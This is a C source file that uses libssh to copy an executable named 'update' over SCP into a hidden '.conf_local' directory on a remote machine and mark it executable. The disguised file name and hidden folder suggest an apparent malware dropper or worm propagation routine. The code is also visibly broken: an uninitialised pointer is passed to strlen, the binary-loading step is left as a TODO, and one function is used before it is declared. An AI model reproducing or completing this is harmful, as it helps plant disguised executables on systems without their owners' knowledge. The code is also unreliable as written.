#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#include "net/ssh.h"
#include "ssh_local.h"

#define NET_PER 0755
#define EXE_NAME "update"

int scp_write(ssh_session *session){

  ssh_scp scp;
  int rc;

  scp = ssh_scp_new(*session, SSH_SCP_WRITE | SSH_SCP_RECURSIVE, ".");

  if(scp==NULL){
    fprintf(stderr, "not able to allocate scp session: %s\n", ssh_get_error(*session));
    return SSH_ERROR;
  }

  rc = ssh_scp_init(scp);

  if(rc!=SSH_OK){
    fprintf(stderr, "not able to init scp session: %s\n", ssh_get_error(*session));
    ssh_scp_free(scp);
    return rc;
  }

  if(__write_file(session, &scp) < 0){
    return rc;
  }
  
  return SSH_OK; // or 1;
}


int __write_file(ssh_session *session, ssh_scp *scp){

  /* TODO : read binaray file and put it in a char *exe (the best way  would be with fgetc but it needs to be in a char not int)  
     and give it to the function */

  int rc;
  char *exe;
  int len = strlen(exe);
  //create dir in ~/.conf_local
  rc = ssh_scp_push_directory(*scp, ".conf_local", NET_PER);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to create dir: %s\n", ssh_get_error(*session));
    return rc;
  }
  
  rc = ssh_scp_push_file (*scp, EXE_NAME, len, NET_PER | NET_PER);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to create file in remote: %s\n", ssh_get_error(*session));
    return rc;
  }

  rc = ssh_scp_write(*scp, exe, len);
  if(rc!=SSH_OK){
    fprintf(stderr, "not able to write to remote: %s\n", ssh_get_error(*session));
    return rc;
  }

  return SSH_OK; // or 1;

}
